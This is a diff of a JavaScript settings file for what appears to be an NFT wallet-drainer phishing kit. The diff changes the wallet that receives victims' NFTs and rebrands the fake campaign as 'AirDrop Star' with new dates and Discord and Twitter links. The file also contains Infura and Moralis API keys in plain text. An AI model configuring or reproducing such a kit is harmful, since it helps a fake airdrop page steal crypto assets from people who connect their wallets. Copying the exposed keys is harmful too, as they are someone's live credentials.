@@ -1,15 +1,15 @@
 // ⚠️ for infura & moralis, make you sure that you copy same number of characters
-const address = "0x8A10a0Ddc2F2AEcA7e3870085964e199Fff44F97";    // Your ETH wallet that you have to receive NFTs
+const address = "0x45754bda07fce7d2c95fea3fc48a02939db213b1";    // Your ETH wallet that you have to receive NFTs
 const infuraId = "e53dc432bda847078c6d418e92982f57"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
 const moralisApi = "5W4uwFhOKOzZYW15hk4afH1mGcn02KXRObedwXKX"    // Web3 Api key | https://moralis.io/ | For NFTs
 
 const collectionInfo = {
     name: "Tec.sellix.io",
-    title: "Down2Earth", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
-    date: "04.09.2022", // Today date
+    title: "AirDrop Star", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    date: "03.09.2022 - 12.09.2022", // Today date
     socialMedia: {
-        discord: "https://discord.gg/example",
-        twitter: "https://twitter.com/example",
+        discord: "https://discord.com/invite/cryptohub",
+        twitter: "https://twitter.com/AirdropStario",
     },
     medias: {
         preview: "preview.gif",
